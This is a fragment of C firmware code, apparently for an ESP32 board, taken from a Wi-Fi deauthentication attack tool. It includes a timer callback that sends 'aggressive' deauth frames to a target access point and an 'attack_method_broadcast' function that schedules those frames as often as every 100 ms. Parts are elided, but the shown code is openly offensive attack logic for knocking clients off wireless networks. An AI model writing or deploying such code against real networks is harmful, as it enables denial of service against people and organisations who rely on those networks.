...
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_aggressive_multi((wifi_ap_record_t *) arg);
}
...
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    ...
    // period_sec=0 → minimal period (100ms = 10 ticks/sec, ~30 frames/sec)
    // Prevents WDT crash from excessive esp_log_write on CPU0.
    uint64_t period_us = (period_sec == 0) ? 100000 : period_sec * 1000000;
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_us));
}
